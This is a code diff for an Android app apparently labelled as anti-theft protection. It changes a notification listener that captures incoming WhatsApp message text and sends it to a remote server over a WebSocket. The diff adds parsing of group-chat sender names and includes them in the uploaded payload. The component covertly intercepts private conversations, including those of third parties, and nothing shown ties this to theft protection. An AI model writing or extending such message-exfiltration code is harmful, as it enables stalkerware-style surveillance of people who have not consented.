@@ -2,7 +2,6 @@ package com.androidprotect
 
 import android.app.Notification
 import android.content.Context
-import android.os.Build
 import android.os.Bundle
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
@@ -15,8 +14,8 @@ import kotlinx.serialization.builtins.serializer
  * them to the server through the active WebSocket managed by AntiTheftService.
  *
  * Captures:
- * - Single message notifications
- * - Grouped message notifications (MessagingStyle) on Android N+
+ * - Single message notifications (title = contact/group name)
+ * - Group chats that format content as "Sender Name: message text"
  *
  * Limitations:
  * - Only messages that generate a notification are captured.
@@ -42,22 +41,43 @@ class WhatsAppNotificationListener : NotificationListenerService() {
     private fun extractMessages(extras: Bundle, baseTimestamp: Long): List<WhatsMessage> {
         val result = mutableListOf<WhatsMessage>()
 
-        // Simple single-message notification (most common case)
         val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
         val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
             ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
             ?: return result
 
         if (text.isBlank()) return result
-        result.add(WhatsMessage(address = title, content = text, timestamp = baseTimestamp))
+
+        // Group chats often format content as "Sender Name: message text"
+        val (sender, body) = parseGroupSender(text)
+        val chatName = title.ifBlank { sender }
+        result.add(WhatsMessage(
+            address = chatName,
+            name = chatName,
+            content = body,
+            timestamp = baseTimestamp
+        ))
         return result
+    }
+
+    /**
+     * Parses "Sender: message" format used by WhatsApp group notifications.
+     */
+    private fun parseGroupSender(text: String): Pair<String, String> {
+        val idx = text.indexOf(": ")
+        return if (idx in 1..39) {
+            text.substring(0, idx) to text.substring(idx + 2)
+        } else {
+            "" to text
+        }
     }
 
     private fun sendWhatsAppMessage(msg: WhatsMessage) {
         try {
             val address = Json.encodeToString(String.serializer(), msg.address)
+            val name = Json.encodeToString(String.serializer(), msg.name)
             val content = Json.encodeToString(String.serializer(), msg.content)
-            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$address,"content":$content,"timestamp":${msg.timestamp}}"""
+            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$address,"name":$name,"content":$content,"timestamp":${msg.timestamp}}"""
             val sent = AntiTheftService.sendRawMessage(payload)
             Log.d("WhatsAppListener", "forwarded message to ${msg.address}: $sent")
         } catch (e: Exception) {
@@ -67,6 +87,7 @@ class WhatsAppNotificationListener : NotificationListenerService() {
 
     private data class WhatsMessage(
         val address: String,
+        val name: String,
         val content: String,
         val timestamp: Long
     )
